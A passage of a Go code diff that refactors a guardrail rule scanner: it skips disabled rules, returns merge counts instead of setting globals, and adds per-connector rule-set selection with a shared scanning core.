 		for _, r := range rf.Rules {
+			if r.Enabled != nil && !*r.Enabled {
+				continue
+			}
 			re, err := compileRegexSafe(r.Pattern)
 			if err != nil {
 				fmt.Fprintf(os.Stderr, "[guardrail] skip rule %s: bad pattern: %v\n", r.ID, err)
@@ -370,12 +472,7 @@ func ApplyRulePackOverrides(rp *guardrail.RulePack) {
 			added++
 		}
 	}
-
-	ruleCategoriesMu.Lock()
-	allRuleCategories = merged
-	ruleCategoriesMu.Unlock()
-	fmt.Fprintf(os.Stderr, "[guardrail] rule pack merged: %d categories overridden, %d added, %d defaults retained\n",
-		overridden, added, len(defaultRuleCategories)-overridden)
+	return merged, overridden, added
 }
 
 // severityRank maps severity strings to numeric ranks for comparison.
@@ -464,7 +561,33 @@ func ScanAllRules(text string, toolName string) []RuleFinding {
 	ruleCategoriesMu.RLock()
 	cats := allRuleCategories
 	ruleCategoriesMu.RUnlock()
+	return scanRuleCategories(cats, text, toolName)
+}
 
+// ScanAllRulesForConnector scans against the named connector's registered
+// rule set (its EffectiveRulePackDir, installed at boot via
+// ApplyConnectorRulePackOverrides). When the connector has no dedicated set
+// — single-connector installs, the OpenClaw generic inspect endpoint, or a
+// connector that never resolved a pack — it falls back to the process-global
+// allRuleCategories, so the single-connector path is byte-for-byte unchanged.
+func ScanAllRulesForConnector(connector, text, toolName string) []RuleFinding {
+	connector = strings.TrimSpace(connector)
+	ruleCategoriesMu.RLock()
+	cats := allRuleCategories
+	if connector != "" {
+		if c, ok := connectorRuleCategories[connector]; ok {
+			cats = c
+		}
+	}
+	ruleCategoriesMu.RUnlock()
+	return scanRuleCategories(cats, text, toolName)
+}
+
+// scanRuleCategories runs every rule in cats against text, scanning both the
+// raw input and a shell-normalized copy to defeat obfuscation. It is the
+// shared core of ScanAllRules / ScanAllRulesForConnector — the only
+// difference between those entry points is which category set they select.
+func scanRuleCategories(cats []ruleCategory, text string, toolName string) []RuleFinding {
 	var findings []RuleFinding
 	seen := make(map[string]bool)
 
